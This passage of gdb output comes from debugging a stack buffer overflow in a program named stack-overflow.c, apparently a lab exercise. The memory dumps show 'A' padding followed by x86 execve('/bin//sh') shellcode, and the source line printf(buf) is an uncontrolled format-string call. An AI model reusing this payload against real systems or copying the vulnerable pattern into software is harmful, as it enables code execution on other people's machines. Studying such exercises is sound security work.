    argc=<error reading variable: Cannot access memory at address 0xe3896e69>,
    argv=<error reading variable: Cannot access memory at address 0xe3896e6d>)
    at stack-overflow.c:9
9		printf(buf);
(gdb) x/20x $ebp
0xbffff4e8:	0x80cd0bb0	0xbffff3f0	0x00000002	0xb7fb8000
0xbffff4f8:	0x00000000	0xb7e1a276	0x00000002	0xbffff594
0xbffff508:	0xbffff5a0	0x00000000	0x00000000	0x00000000
0xbffff518:	0xb7fb8000	0xb7fffc04	0xb7fff000	0x00000000
0xbffff528:	0x00000002	0xb7fb8000	0x00000000	0xe94d2b77
(gdb) x/100x $esp
0xbffff3d0:	0xbffff3e0	0xbffff6e4	0x00000110	0xf63d4e2e
0xbffff3e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff3f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff400:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff410:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff420:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff430:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff440:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff450:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff460:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff470:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff480:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff490:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff4a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff4b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff4c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff4d0:	0x41414141	0x50c03141	0x732f2f68	0x622f6868
0xbffff4e0:	0xe3896e69	0xe1895350	0x80cd0bb0	0xbffff3f0
0xbffff4f0:	0x00000002	0xb7fb8000	0x00000000	0xb7e1a276
0xbffff500:	0x00000002	0xbffff594	0xbffff5a0	0x00000000
0xbffff510:	0x00000000	0x00000000	0xb7fb8000	0xb7fffc04
0xbffff520:	0xb7fff000	0x00000000	0x00000002	0xb7fb8000
0xbffff530:	0x00000000	0xe94d2b77	0xd5e34767	0x00000000
0xbffff540:	0x00000000	0x00000000	0x00000002	0x08048370
0xbffff550:	0x00000000	0xb7ff0020	0xb7e1a189	0xb7fff000
(gdb)
```